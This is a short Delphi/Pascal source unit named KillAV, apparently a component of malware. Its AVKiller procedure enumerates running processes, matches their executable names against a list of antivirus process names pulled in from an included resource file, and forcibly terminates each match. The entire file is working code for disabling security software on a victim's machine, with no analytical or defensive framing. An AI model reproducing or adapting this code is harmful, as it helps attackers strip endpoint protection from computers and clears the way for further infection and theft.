UNIT KillAV;

INTERFACE

USES
  Utils, ACLUtils;

PROCEDURE AVKiller;

VAR
  NumberOfAVNames : WORD;
  AVName          : XArray;

{$I Resources\TAVNAME.INI}

IMPLEMENTATION

PROCEDURE AVKiller;
VAR
  ContinueLoop    : BOOL;
  FSnapshotHandle : THandle;
  FProcessEntry32 : TProcessEntry32;
  I               : WORD;
BEGIN
  FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
  ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
  WHILE ContinueLoop DO BEGIN
    FOR I:=1 TO NumberOfAVNames DO
      IF ((UpperCase(ExtractFileName(STRING(FProcessEntry32.szExeFile)))=AVName[I])
        OR(UpperCase(FProcessEntry32.szExeFile)=AVName[I])) THEN
          TerminateProcess(OpenProcess(1,False,FProcessEntry32.th32ProcessID),0);
    ContinueLoop:=Process32Next(FSnapshotHandle,FProcessEntry32);
  END;
  CloseHandle(FSnapshotHandle);
END;

END.
